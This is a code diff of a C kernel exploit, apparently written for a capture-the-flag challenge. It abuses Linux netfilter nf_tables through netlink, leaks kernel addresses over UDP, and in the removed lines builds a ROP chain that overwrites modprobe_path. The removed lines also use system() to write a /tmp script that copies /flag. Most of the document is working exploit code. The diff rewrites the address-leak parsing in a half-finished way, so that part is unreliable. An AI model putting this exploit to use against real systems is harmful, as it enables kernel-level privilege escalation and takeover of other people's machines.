@@ -9,7 +9,7 @@
 #include <time.h>
 #include <string.h>
 #include <netinet/in.h>
-#include <stddef.h>    /* for offsetof */
+#include <stddef.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <arpa/inet.h>
@@ -31,87 +31,6 @@
 char pkt_message[512] = {0, };
 char pkt_buffer[512] = {0, };
 int pkt_port = 0;
-
-void hexdump(const void* data, size_t size) {
-    unsigned char *p = (unsigned char*)data;
-    for (size_t i = 0; i < size; i++) {
-        printf("%02X ", p[i]);
-        if ((i + 1) % 16 == 0 || i == size - 1) {
-            printf("\n");
-        }
-    }
-}
-
-void *sender_thread(void *arg) {
-    int client_socket;
-    struct sockaddr_in server_addr;
-    
-    // Create a UDP socket
-    if ((client_socket = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
-        perror("socket");
-        exit(1);
-    }
-    
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(pkt_port);
-    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
-    
-    // Send the UDP packet
-    sendto(client_socket, pkt_message, 512, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-    
-    close(client_socket);
-    return NULL;
-}
-
-void *receiver_thread(void *arg) {
-    int server_socket;
-    struct sockaddr_in server_addr, client_addr;
-    
-    // Create a UDP socket
-    if ((server_socket = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
-        perror("socket");
-        exit(1);
-    }
-    
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(pkt_port);
-    server_addr.sin_addr.s_addr = INADDR_ANY;
-    
-    // Bind the socket to the server address
-    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
-        perror("bind");
-        exit(1);
-    }
-    
-    socklen_t client_addr_len = sizeof(client_addr);
-    
-    // Receive the UDP packet
-    recvfrom(server_socket, pkt_buffer, 512, 0, (struct sockaddr *)&client_addr, &client_addr_len);
-    
-    close(server_socket);
-    return NULL;
-}
-
-void write_to_file(const char *which, const char *format, ...) {
-  FILE * fu = fopen(which, "w");
-  va_list args;
-  va_start(args, format);
-  if (vfprintf(fu, format, args) < 0) {
-    perror("cannot write");
-    exit(1);
-  }
-  fclose(fu);
-}
-
-void init_cpu(void){
-    cpu_set_t set;
-    CPU_ZERO(&set);
-    CPU_SET(0, &set);
-    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
-        perror("[-] sched_setaffinity");
-        exit(EXIT_FAILURE);    
-    }
-}
 
 void init_namespace(void) {
     uid_t uid = getuid();
@@ -325,7 +244,6 @@ int main(int argc, char *argv[])
 {
     printf("[+] exploit process starting\n");
 
-    init_cpu();
     init_namespace();
 
     struct mnl_socket *nl;
@@ -339,7 +257,6 @@ int main(int argc, char *argv[])
     seq = 100;
     batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
 
-    // HERE
     begin_batch(batch, &seq);
 
     add_table(batch, &seq, "exploit_table");
@@ -358,28 +275,6 @@ int main(int argc, char *argv[])
     check++;
 
     end_batch(batch, &seq);
-    //
-
-    nl = mnl_socket_open(NETLINK_NETFILTER);
-    if (nl == NULL)
-    {
-        perror("mnl_socket_open");
-        exit(EXIT_FAILURE);
-    }
-
-    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
-    {
-        perror("mnl_socket_bind");
-        exit(EXIT_FAILURE);
-    }
-    portid = mnl_socket_get_portid(nl);
-
-    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
-                          mnl_nlmsg_batch_size(batch)) < 0)
-    {
-        perror("mnl_socket_send");
-        exit(EXIT_FAILURE);
-    }
 
     mnl_nlmsg_batch_stop(batch);
 
@@ -411,7 +306,7 @@ int main(int argc, char *argv[])
     pthread_t leak_sender, leak_receiver;
     printf("[+] leak_sender -> leak_receiver (udp)\n");
     pkt_port = 1234;
-    memset(pkt_message, 'a', 512);
+    //memset(pkt_message, 'a', 512);
     pthread_create(&leak_sender, NULL, sender_thread, NULL);
     pthread_create(&leak_receiver, NULL, receiver_thread, NULL);
 
@@ -420,62 +315,17 @@ int main(int argc, char *argv[])
 
     unsigned long leak = 0;
 
-    memcpy((char*)&leak,pkt_buffer+0x40,8);
-    unsigned long kernel_stack = leak - 0x1bfb48;
-
     memcpy((char*)&leak,pkt_buffer+0x38,8);
-    unsigned long kernel_base = leak - 0x6744e;
-
-    hexdump(pkt_buffer, 48);
+    unsigned long kernel_stack = leak;
+    printf("0x%lx\n", leak);
+    memcpy((char*)&leak,pkt_buffer+0x40,8);
+    printf("0x%lx\n", leak);
+    unsigned long kernel_base = leak;
+    leak = leak & 0xffffffffff000000;
+    kernel_stack = kernel_stack & 0xffffff0000000000;
+    kernel_base = leak;
     printf("[+] kernel_base = 0x%lx\n", kernel_base);
     printf("[+] kernel_stack = 0x%lx\n", kernel_stack);
-
-    unsigned long rop_chain[30];
-    int chain_count = 0;
-
-    rop_chain[chain_count] = 0xdeadbeef12341234; chain_count++;
-    rop_chain[chain_count] = kernel_base + 0xe02052; chain_count++; // cli; ret;
-
-    rop_chain[chain_count] = kernel_base + 0xe0015d; chain_count++; // <__do_softirq+349>
-    rop_chain[chain_count] = 0x0; chain_count++;
-    rop_chain[chain_count] = 0x0; chain_count++;
-    rop_chain[chain_count] = 0x0; chain_count++;
-    rop_chain[chain_count] = 0x4001000000000000; chain_count++;
-    for(int i=0;i<6;i++){
-        rop_chain[chain_count] = 0x0; chain_count++;
-    }
-
-    rop_chain[chain_count] = kernel_base + 0x1b44; chain_count++; // pop rsi; ret;
-    rop_chain[chain_count] = kernel_base + 0x144dac0; chain_count++; // &modprobe
-    rop_chain[chain_count] = kernel_base + 0x27c91; chain_count++; // pop rax; ret;
-    rop_chain[chain_count] = 0x646f6d2f706d742f; chain_count++; // b'/tmp/mod'
-    rop_chain[chain_count] = kernel_base + 0x4dc3e; chain_count++; // mov qword ptr [rsi], rax ; ret
-
-    rop_chain[chain_count] = kernel_base + 0x68d; chain_count++; // pop rbp; ret;
-    rop_chain[chain_count] = kernel_stack + 0x1c7ba8; chain_count++; // sfp
-
-    for(int i=0;i<10;i++){
-        rop_chain[chain_count] = kernel_base + 0x485b69; chain_count++; // ret dummy
-    }
-
-    printf("[+] create /tmp/moddprobe & /tmp/pwn\n");
-
-    system("echo -e '#!/bin/sh\ncp /flag /tmp/flag\nchmod a+r /tmp/flag' > /tmp/moddprobe");
-    system("chmod +x /tmp/moddprobe");
-    system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
-    system("chmod +x /tmp/pwn");
-    
-    pthread_t exploit_sender, exploit_receiver;
-    pkt_port = 8080;
-    memset(pkt_buffer, '\0', 512);
-    memset(pkt_message, 'a', 512);
-    memcpy(pkt_message, (char*)rop_chain, 0xf0);
-    printf("[+] exploit_sender -> exploit_receiver (udp)\n");
-    pthread_create(&exploit_sender, NULL, sender_thread, NULL);
-    pthread_create(&exploit_receiver, NULL, receiver_thread, NULL);
-
-    pthread_join(exploit_sender, NULL);
-    pthread_join(exploit_receiver, NULL);
 
     return EXIT_SUCCESS;
 }
